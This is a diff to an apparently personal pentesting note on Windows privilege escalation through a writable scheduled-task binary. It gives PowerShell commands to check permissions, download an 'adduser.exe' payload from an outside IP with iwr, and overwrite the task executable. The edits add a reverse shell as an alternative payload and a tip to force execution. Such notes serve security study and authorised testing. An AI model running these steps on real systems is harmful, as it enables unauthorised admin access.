@@ -32,7 +32,7 @@ we can check the permissions on the directory of the task
 
     PS > icacls C:\Users\steve\Pictures\mytask.exe
 
-so lets copy our adduser exe over
+so lets copy our adduser exe over (or a reverse shell)
 
     PS > iwr -Uri http://192.168.1.1/adduser.exe -Outfile mytask.exe
 
@@ -40,7 +40,7 @@ and then move it to the directory the task executes from
 
     PS > move .\mytask.exe .\Pictures\
 
-now to get our code to execute we must wait for the next scheduled execution of the task
+now to get our code to execute we must wait for the next scheduled execution of the task - check the execution parameters , it may be on a reboot or something that can be forced with sc.exe
 
 ### TODO: need to write a script to parse the output of the tasks output to be more useful
 
